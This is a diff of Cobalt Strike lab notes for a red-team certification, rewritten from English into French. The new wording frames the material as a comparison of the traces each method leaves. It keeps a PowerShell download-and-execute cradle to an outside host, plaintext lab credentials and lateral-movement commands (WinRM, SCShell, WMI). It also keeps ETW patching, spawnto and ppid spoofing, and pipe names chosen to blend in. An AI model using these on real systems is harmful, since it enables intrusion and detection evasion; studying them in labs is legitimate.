@@ -554,7 +554,7 @@ CS GUI: Attacks > Scripted Web Delivery
 Select: http listener → Launch → copy the URL
 ```
 
-On target (Workstation — PowerShell):
+Sur la workstation du lab, la commande ci-dessous appartient à l’exercice de validation PowerShell :
 
 ```powershell
 iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/a")
@@ -562,38 +562,33 @@ iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/a"
 
 <img src="/images/defence-evasion-lab-06.png" width=1024>
 
-Switch back to Attacker Desktop — a new beacon should check in.
+### Vérifier le résultat du test
 
-> If Defender blocks the download: artifact or resource kit still has a signature. Run ThreatCheck
-> on the artifact again. If Defender blocks the in-memory execution: stage block settings aren't
-> applied or profile didn't reload correctly (check docker logs).
+Sur l’Attacker Desktop, consulter la console Cobalt Strike pour confirmer la présence éventuelle d’un nouveau Beacon. Si la connexion échoue, rapprocher les journaux du script, les événements de processus et les alertes Defender du moment du test.
 
 ---
 
-### Test lateral movement with custom service spawnto
+## Lateral Movement — Comparer les traces des méthodes
 
-**`jump psexec64` — OPSEC-🔴UNSAFE. Do NOT use this unless every other path fails.**
+Cette partie compare plusieurs mécanismes d’accès distant et leurs événements Windows.
 
-`jump psexec64` creates a Windows service on the remote target to execute the beacon payload.
-This produces multiple high-confidence detection events simultaneously:
+### Service distant et événement 7045
 
-| What it does | Detection event | Event log |
-|-------------|----------------|-----------|
-| Creates a new service on the remote host | Service Control Manager | Event ID 7045 — "A new service was installed in the system" |
-| Authenticates via SMB | Network logon | Event ID 4624 Type 3 + Event ID 4672 (if admin) |
-| Writes the service binary to disk | File write to `%SystemRoot%\` or `ADMIN$` | Sysmon Event ID 11 |
-| Default artifact is `rundll32.exe` without `ak-settings` | Suspicious service binary | Defender / EDR |
-| Service runs, then is immediately deleted | Service create+delete pair | Event ID 7045 + Event ID 7036 |
+La méthode `jump psexec64` peut créer un service Windows sur la machine distante. Elle est classée **OPSEC-🔴UNSAFE** dans les notes, car cette opération est fortement observable.
 
-**Event 7045 is an explicit OPSEC deduction in the exam scoring criteria.** Even with the
-`ak-settings` spawnto override, the service creation events still fire — you are only changing
-which executable the service runs, not preventing the service from being created.
+| Opération | Événement possible | Interprétation |
+|---|---|---|
+| Création d’un service | 7045 | Nouveau service enregistré |
+| Connexion réseau SMB | 4624 type 3 | Authentification réseau |
+| Droits élevés | 4672 | Privilèges spéciaux attribués à une connexion |
+| Écriture d’un binaire sur disque | Sysmon 11 selon configuration | Création de fichier |
+| Démarrage ou arrêt du service | 7036 | Changement d’état d’un service |
 
----
+**Important :** changer le processus temporaire du payload ne supprime pas les événements liés à la création du service.
 
-### Lateral Movement — OPSEC Preference Order
+### Comparer les méthodes de Lateral Movement
 
-**Use the highest-OPSEC option that works. Fall down the list only if the preferred option fails.**
+Les catégories OPSEC du tableau sont celles du support CRTO. Elles servent à comparer les mécanismes et leurs traces, pas à garantir une absence de détection.
 
 ```
 1. jump winrm64        OPSEC-🟢SAFE      ← USE THIS FIRST
@@ -604,7 +599,9 @@ which executable the service runs, not preventing the service from being created
 
 ---
 
-#### Option 1 — `jump winrm64` OPSEC-🟢SAFE
+### WinRM — `jump winrm64`
+
+Le lab présente la connexion WinRM comme une méthode d’accès distant distincte des opérations basées sur la création de services.
 
 ```cs
 // Impersonate a local admin on the target first:
@@ -615,20 +612,13 @@ beacon> make_token CONTOSO\rsteel Passw0rd!
 beacon> jump winrm64 lon-ws-1 smb
 ```
 
-**What happens:** CS authenticates to the WinRM service (TCP 5985) on the remote host. The
-beacon DLL is injected into `wsmprovhost.exe` — the legitimate Windows Remote Management
-provider host process. No new service. No file written to disk. Authentication shows as
-Event 4624 Type 3 (network logon) — normal for WinRM sessions.
+**Principe :** WinRM utilise notamment le port TCP 5985 dans les configurations HTTP courantes. Le scénario s’appuie sur le processus `wsmprovhost.exe` et sur une authentification réseau pouvant générer l’événement 4624.
 
-**Requirement:** WinRM must be enabled on the target (default on servers, often disabled on
-workstations). Test with `powerpick Test-WSMan <target>` from the source beacon first.
+**Prérequis :** le service WinRM doit être disponible sur la machine visée et le compte doit posséder les droits appropriés.
 
----
+### SCShell — `jump scshell64`
 
-#### Option 2 — `jump scshell64` (OPSEC-🟠CAUTION — no Event 7045)
-
-SCShell abuses an existing, already-running service by temporarily modifying its binary path
-to execute the beacon, then restoring the original path. No new service is created — no Event 7045.
+La méthode SCShell modifie temporairement la configuration d’un service existant dans le scénario, au lieu de créer un service supplémentaire.
 
 ```cs
 // Load the SCShell aggressor script first (one-time):
@@ -644,20 +634,16 @@ beacon> make_token CONTOSO\rsteel Passw0rd!
 beacon> jump scshell64 lon-ws-1 smb
 ```
 
-**What it generates:**
-- Service modification events (Event ID 7040 — service binary path changed) — less alarming than 7045
-- Beacon lands as SYSTEM inside the modified service process
-- If you see error `Advapi32$StartServiceA failed 1056` — service was already running, wait a
-  few minutes and retry (SCShell requires the service to be stopped before modification)
+**Événements à surveiller :**
+- L’événement **7040** peut être associé à une modification de configuration de service.
+- Les changements d’état d’un service peuvent être journalisés.
+- L’erreur `StartServiceA failed 1056` correspond à un problème de démarrage lorsque le service est déjà en cours d’exécution.
 
-**Why it's not SAFE:** Modifying an existing service binary path is still anomalous and visible
-to behaviour-based EDR. Quieter than psexec64 but not silent.
+La modification d’un service existant reste potentiellement anormale et observable par les contrôles comportementaux.
 
----
+### WMI — `remote-exec wmi`
 
-#### Option 3 — `remote-exec wmi` (OPSEC-🟠CAUTION — no service, no 7045)
-
-WMI process creation via `Win32_Process.Create`. No service involved.
+WMI permet de lancer certains traitements à distance, par exemple au moyen de `Win32_Process.Create`, sous réserve des droits et paramètres de sécurité.
 
 ```cs
 beacon> make_token CONTOSO\rsteel Passw0rd!
@@ -667,18 +653,15 @@ beacon> make_token CONTOSO\rsteel Passw0rd!
 beacon> remote-exec wmi lon-ws-1 C:\Windows\Temp\update.exe
 ```
 
-**Limitation:** `remote-exec wmi` executes a command but does not automatically link a new
-beacon back via SMB. You need the payload already on the target (uploaded separately) or
-use a PowerShell one-liner via WMI to download and execute. WMI execution is logged via
-Event ID 4688 (process creation) and WMI activity log — less noisy than a service but not silent.
+**Observation :** une opération WMI peut générer des événements de création de processus (4688 selon la configuration), ainsi que des événements WMI-Activity. Elle ne produit pas automatiquement les mêmes résultats qu’un Beacon lié par SMB.
 
-> `jump psexec64` (OPSEC-🔴UNSAFE — last resort only)  
+La fiche distingue les mécanismes WinRM, SCShell, WMI et création de service afin de comparer leurs caractéristiques opérationnelles et leurs journaux.
 
 <img src="/images/defence-evasion-lab-07.png" width=860>
 
 ---
 
-### Lateral Movement Decision Flow
+### Tableau de décision Lateral Movement du lab
 
 ```
 Need to move to <target>?
@@ -701,39 +684,36 @@ Test-WSMan <target> reachable?
 
 ---
 
-## SITREP OPSEC Score
+## Synthèse des critères OPSEC étudiés
 
-| OPSEC Score Criteria [notes/Exam-Instructions.md](Exam-Instructions.md) | addresses OPSEC |
-|----------------------------------------------------|----------------------------------|
-| Blocked by Defender / AppLocker | Custom Artifact Kit backward while loop + magic_mz + Resource Kit string obfuscation |
-| Default CS indicators pipe names, injection | `post-ex.pipename` = `dotnet-diagnostic-*`, `post-ex.spawnto_x64` = `werfault.exe`, `process-inject` execute block |
-| Outbound from unusual processes | `post-ex.spawnto_x64` controls which process handles fork&run (werfault.exe) |
-| Suspicious lateral movement | This is separate — prefer `jump winrm64` over `jump psexec64` |
+| Critère cité dans [les consignes de l’examen](../notes/Exam-Instructions.md) | Sujet à examiner |
+|---|---|
+| Blocage par Defender ou AppLocker | Résultats des contrôles statiques, AMSI, mémoire et comportement |
+| Indicateurs Cobalt Strike par défaut | Arborescence des processus, named pipes et opérations mémoire |
+| Trafic sortant inhabituel | Processus source, destination réseau, DNS et en-tête HTTP Host |
+| Lateral Movement observable | Traces WinRM, WMI, SMB ou services Windows selon la méthode |
 
-The lab-proven values above are specifically tuned against Windows Defender  
-They address every layer Defender uses against CS.  
+### Contrôler les résultats des builds
 
-1. **Run ThreatCheck every time on rebuild.** If CS is updated between new
-   signatures may appear. The artifact/resource kit is not a one-time fix — verify clean each time.
+Après chaque modification de l’Artifact Kit ou du Resource Kit, comparer les résultats de ThreatCheck et les journaux. Les signatures et comportements des produits de protection évoluent : le résultat d’une ancienne version ne prédit pas celui d’une nouvelle version.
 
-2. **ETW 🧠 — driver-bofs is NOT a userland ETW patch.** `C:\Tools\driver-bofs\etw.x64.o`
-   patches ETW kernel callbacks and requires a kernel driver already loaded — it will error with
-   `Error getting callback offsets` without one. This is a BYOVD/kernel-level kit (CRTO II scope).
+### ETW et pilotes
 
-   CRTO: the profile's `amsi_disable "true"` in `post-ex` covers AMSI in fork&run
-   processes. A separate userland ETW BOF (patching `EtwEventWrite` in ntdll) is the correct
-   post-initial-access step if needed, but is **not staged in the lab tools** and is not a primary
-   OPSEC scoring criterion. Skip the ETW BOF step unless a userland variant is sourced separately.
+Les notes mentionnent le fichier `C:\Tools\driver-bofs\etw.x64.o` et la différence entre les opérations au niveau du noyau et celles en espace utilisateur.
 
-   If a userland ETW BOF becomes available:
+**Point technique :** les méthodes nécessitant un pilote noyau ne sont pas équivalentes aux appels ETW disponibles dans un processus utilisateur. L’erreur `Error getting callback offsets` peut indiquer que les prérequis du module ne sont pas remplis.
+
+Le module ETW décrit ici n’est pas présenté comme une étape obligatoire du lab CRTO de base.
+
    ```cs
    beacon> inline-execute C:\path\to\etw_userland.x64.o    // patches EtwEventWrite in ntdll — no driver needed
    ```
 
-   Repeat after every lateral move to a new host.
+### Vérifier le contexte après un changement de machine
 
-3. **Set ppid and spawnto per-beacon context** — the profile sets a default, but after lateral
-   movement you should set context-appropriate values:
+Les réglages locaux peuvent varier selon chaque machine et chaque processus Beacon. La valeur par défaut du Malleable C2 Profile ne décrit pas nécessairement la configuration active de toutes les sessions.
+
+Le bloc suivant illustre des paramètres PPID et spawnto utilisés dans le lab.
 
    ```cs
    beacon> process_browser                       // GUI tab — find contextually appropriate parent PID
@@ -741,30 +721,27 @@ They address every layer Defender uses against CS.
    beacon> spawnto x64 %windir%\sysnative\werfault.exe
    ```
 
+### Documenter une détection
 
-### Encounter a detection  🕵️ 
-- Use ThreatCheck to identify the flagged bytes/pattern
-- Use Ghidra to locate in the compiled artifact
-- Modify the source-level code (not the bytes directly) → rebuild
+Lorsqu’un test génère une alerte, relever la date, les arguments, les versions des composants et la télémétrie disponible. Ghidra et ThreatCheck permettent de rapprocher une région du fichier, son code source et les résultats du test.
 
 ---
 
-## The Named Pipe Question — SMB Listener vs post-ex Pipename
+## Named Pipes — Listener SMB et `post-ex.pipename`
 
-Two completely separate settings are involved:
+Deux paramètres distincts de Cobalt Strike sont concernés. Ils ne jouent pas le même rôle.
 
-### 1. SMB Listener pipename (set when creating the listener)
+### Named pipe du listener SMB
 
-From the Cobalt Strike Primer lab, the SMB listener was created with:
+Le listener SMB définit son nom de pipe dans l’interface de Cobalt Strike.
+
 ```
 Pipename: TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
 ```
 
- 💡 ** DO NOT use this exact pipename **
+**Exemple du lab :** le préfixe `TSVCPIPE-*` est associé à certains modèles connus de Cobalt Strike et peut être utilisé par les outils de détection.
 
-`TSVCPIPE-*` is a well-known CS default pattern. Defenders and detection rules flag 🕵️ .
-create the SMB listener with a custom unique pipename that blends with legitimate
-Windows pipe patterns. Examples of legitimate-looking patterns:
+La vérification porte sur la configuration du listener, le nom de la named pipe réellement créée et les événements associés. Le bloc suivant présente les modèles de noms mentionnés par les supports d’exercice.
 
 ```
 # Good — blends with Windows internal pipes:
@@ -780,32 +757,28 @@ postex_*
 MSSE-*-server
 ```
 
-👁️ will need to recreate the SMB listener in the environment. Do NOT copy the lab pipename.
+La configuration du listener SMB est indépendante des paramètres des commandes Post-Exploitation. Les changements éventuels doivent être relevés dans les notes du lab.
 
-### 2. `post-ex.pipename` in the Malleable C2 profile
+### Paramètre `post-ex.pipename` du Malleable C2 Profile
 
 ```
 set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
 ```
 
-This controls the named pipe that fork&run (`execute-assembly`, `powerpick`, `mimikatz`, etc.)
-uses to receive output from the sacrificial process back to the beacon. This is **not** the same
-as the SMB listener pipe.
+**Fonction :** `post-ex.pipename` concerne les échanges de sortie des commandes exécutées avec fork-and-run, notamment `execute-assembly` et `powerpick`. Il ne définit pas le nom du listener SMB C2.
 
-- The `#####` and `####-####...` patterns are wildcards — CS replaces them with random digits at runtime
-- The `dotnet-diagnostic-` prefix blends with .NET CLR diagnostic pipes that exist on any Windows system with .NET installed
-- The comma-separated second pattern is a fallback pipe name format
+Les modèles avec `#####` et d’autres caractères génériques sont complétés par Cobalt Strike lors de leur utilisation.
 
-**Summary:**
+| Usage | Emplacement du réglage | Exemple du lab |
+|---|---|---|
+| Communications C2 SMB | Interface du listener SMB | `TSVCPIPE-4b2f70b3-...` |
+| Sortie fork-and-run | Malleable C2 Profile : `post-ex.pipename` | `dotnet-diagnostic-#####...` |
 
-| Pipe | Controlled by | Lab value | 🕵️ |
-|------|--------------|-----------|----------------|
-| SMB C2 comms pipe | Listener settings in CS GUI | `TSVCPIPE-4b2f70b3-...` | Custom unique name — NOT TSVCPIPE |
-| Fork&run output pipe | `post-ex.pipename` in profile | `dotnet-diagnostic-#####...` | Use lab value — already OPSEC-🟢SAFE |
+La similarité d’un nom avec une pipe Windows légitime ne prouve pas qu’une communication est bénigne.
 
 ---
 
-## Methodology - Defence Evasion Stpes
+## Récapitulatif — Defense Evasion
 
 ```
 1. SSH attacker@10.0.0.5 → cd /opt/cobaltstrike/profiles → nano default.profile
@@ -845,5 +818,6 @@ as the SMB listener pipe.
    beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 ```
 
-> **You have bypassed Windows Defender by modifying Cobalt Strike's default artifacts, resources,
-> and post-exploitation behaviours. Every step above maps to an OPSEC scoring criterion.**
+> **Bilan du lab :** les exercices illustrent la configuration du Malleable C2 Profile, la compilation de l’Artifact Kit et du Resource Kit, ainsi que les observations de Microsoft Defender et des EDR.
+>
+> Aucune de ces configurations ne garantit un contournement de la protection. Le résultat doit être établi par des tests et la comparaison des journaux.
